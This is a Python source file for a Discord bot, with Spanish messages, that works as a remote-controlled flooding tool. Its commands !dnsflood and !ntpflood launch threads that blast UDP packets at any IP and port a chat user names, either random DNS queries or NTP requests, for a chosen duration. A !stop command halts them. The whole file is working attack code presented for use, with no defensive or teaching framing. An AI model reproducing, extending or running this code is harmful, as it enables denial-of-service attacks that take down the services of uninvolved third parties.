import discord
from discord.ext import commands
import socket
import threading
import time
import os
import random

TOKEN_FILE = "token.txt"

# Leer o pedir el token
if not os.path.exists(TOKEN_FILE):
    token = input("🔑 Ingresa el token de tu bot de Discord: ")
    with open(TOKEN_FILE, "w") as f:
        f.write(token)
else:
    with open(TOKEN_FILE, "r") as f:
        token = f.read().strip()

# Configurar intents
intents = discord.Intents.default()
intents.message_content = True

# Crear instancia del bot
bot = commands.Bot(command_prefix='!', intents=intents)

# Variables de ataque
attack_thread = None
attack_in_progress = False
attack_type = ""
stop_event = threading.Event()
last_attack_time = 0
cooldown_seconds = 10

# Función para crear embeds
def make_embed(title, description, color=discord.Color.blue()):
    return discord.Embed(
        title=title,
        description=description,
        color=color
    )

def random_domain():
    return f"{random.randint(1000,9999)}.example.com"

def build_dns_query(domain):
    transaction_id = b'\x00\x01'
    flags = b'\x01\x00'
    questions = b'\x00\x01'
    answer_rrs = b'\x00\x00'
    authority_rrs = b'\x00\x00'
    additional_rrs = b'\x00\x00'
    qname = b''.join(bytes([len(x)]) + x.encode() for x in domain.split('.')) + b'\x00'
    qtype = b'\x00\x01'
    qclass = b'\x00\x01'
    return transaction_id + flags + questions + answer_rrs + authority_rrs + additional_rrs + qname + qtype + qclass

def dns_flood(ip, port, duration):
    global stop_event
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    end_time = time.time() + duration
    try:
        while not stop_event.is_set() and time.time() < end_time:
            domain = random_domain()
            dns_query = build_dns_query(domain)
            sock.sendto(dns_query, (ip, port))
            time.sleep(0.001)
    except Exception:
        pass
    finally:
        sock.close()

def build_ntp_request():
    return b'\x1b' + 47 * b'\0'

def ntp_flood(ip, port, duration):
    global stop_event
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    ntp_payload = build_ntp_request()
    end_time = time.time() + duration
    try:
        while not stop_event.is_set() and time.time() < end_time:
            sock.sendto(ntp_payload, (ip, port))
            time.sleep(0.001)
    except Exception:
        pass
    finally:
        sock.close()

@bot.event
async def on_ready():
    print(f"🛡️ Bot conectado como {bot.user.name}")

@bot.command(name='dnsflood')
async def dnsflood(ctx, ip: str, port: int, duration: int):
    global attack_thread, attack_in_progress, attack_type, stop_event, last_attack_time

    if attack_in_progress:
        await ctx.send(embed=make_embed("❌ Error", "Ya hay un ataque ejecutandose"))
        return

    attack_in_progress = True
    attack_type = "dnsflood"
    stop_event.clear()
    last_attack_time = time.time()

    attack_thread = threading.Thread(target=dns_flood, args=(ip, port, duration))
    attack_thread.start()

    await ctx.send(embed=make_embed("🚀 Ataque iniciado", f"DNS flood `{ip}:{port}` `{duration}`"))


@bot.command(name='ntpflood')
async def ntpflood(ctx, ip: str, port: int, duration: int):
    global attack_thread, attack_in_progress, attack_type, stop_event, last_attack_time

    if attack_in_progress:
        await ctx.send(embed=make_embed("❌ Error", "Ya hay un ataque en ejecucion"))
        return

    attack_in_progress = True
    attack_type = "ntpflood"
    stop_event.clear()
    last_attack_time = time.time()

    attack_thread = threading.Thread(target=ntp_flood, args=(ip, port, duration))
    attack_thread.start()

    await ctx.send(embed=make_embed("🚀 Ataque iniciado", f"NTP flood`{ip}:{port}` `{duration}`"))


@bot.command(name='stop')
async def stop(ctx):
    global stop_event, attack_thread, attack_in_progress, attack_type

    if not attack_in_progress:
        await ctx.send(embed=make_embed("ℹ️", "No hay ningún ataque en curso"))
        return

    stop_event.set()
    if attack_thread:
        attack_thread.join()
    attack_thread = None
    attack_in_progress = False
    attack_type = ""

    await ctx.send(embed=make_embed("🛑 Ataque detenido", "Todos los ataques han sido detenidos"))

@bot.command(name='ayuda')
async def ayuda(ctx):
    embed = make_embed(
        "⚡ Comandos disponibles ⚡",
        """```css
!ayuda                       - Muestra los comandos disponibles
!dnsflood <ip> <port> <time> - Activo🚀
!ntpflood <ip> <port> <time> - Activo🚀
!stop                        - Detiene todos los ataques
```"""
    )
    await ctx.send(embed=embed)

bot.run(token)
